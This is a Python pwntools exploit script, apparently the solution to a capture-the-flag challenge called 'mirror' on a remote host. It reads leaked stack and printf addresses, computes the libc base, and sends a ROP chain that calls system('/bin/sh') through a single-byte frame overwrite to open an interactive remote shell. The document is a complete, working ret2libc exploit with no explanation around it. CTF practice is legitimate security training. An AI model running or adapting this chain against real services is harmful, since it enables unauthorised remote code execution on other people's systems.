from pwn import *
import os

HOST = "pwn.digitalocean.com"
PORT = 10003
BINARY = "./mirror"
LIBC = "./libc6_2.27-3ubuntu1.3_amd64.so"
# LIBC = ""

# Execution context
context.update(arch='amd64', os='linux')

local = input("Run local? (y/n): ").strip()

if local == 'y':

    debug = input("Debug? (y/n)").strip()
    if debug == 'y':
        print("GDB will open...")
        p = gdb.debug(BINARY)

    else:
        p = process(BINARY)
    
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so", checksec=False)

else:
    p = remote(HOST, PORT)
    libc = ELF(LIBC, checksec=False)


# Get ELF info
elf = ELF(BINARY, checksec=False) # Extract data from binary
rop = ROP(elf) # Find ROP gadgets

def reachMirror(p):
    p.recv()
    p.sendline('y')

    # Get input offset
    p.recvuntil(b'[')
    rec = p.recvuntil(b']').decode()[:-1]
    input_addr = int(rec[2:], 16)
    log.info("INPUT variable address: " + rec)

    buff_off = int(rec[-2:],16)

    # Get printf offset
    p.recvuntil(b'[')
    rec = p.recvuntil(b']').decode()[:-1]
    printf_addr = int(rec[2:], 16)
    log.info("LIBC PRINTF variable address: " + rec)

    if LIBC == '':
        log.info("Get libc!")
        exit()

    return input_addr, buff_off, printf_addr

input_addr, buff_off, printf_addr = reachMirror(p)


# Get libc address
def get_libc_base():
    PRINTF_PLT = libc.symbols['printf']
    LIBC_BASE = printf_addr - PRINTF_PLT

    log.info("LIBC BASE: " + hex(LIBC_BASE))

    return LIBC_BASE

LIBC_BASE = get_libc_base()



rop = ROP(libc) # Find ROP gadgets
POP_RDI = LIBC_BASE + (rop.find_gadget(['pop rdi', 'ret']))[0]
log.info("POP RDI address: " + hex(POP_RDI))

BINSH = LIBC_BASE + next(libc.search(b"/bin/sh"))
log.info("BINSH address: " + hex(BINSH))

SYSTEM = LIBC_BASE + libc.sym["system"] # libc call to system
log.info("SYSTEM address: " + hex(SYSTEM))

EXIT = LIBC_BASE + libc.sym["exit"] # libc call to exit
log.info("EXIT address: " + hex(EXIT))



# Payload
payload = p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT) + bytes([buff_off-8])


log.info("Sending payload...")
p.send(payload)
p.interactive()
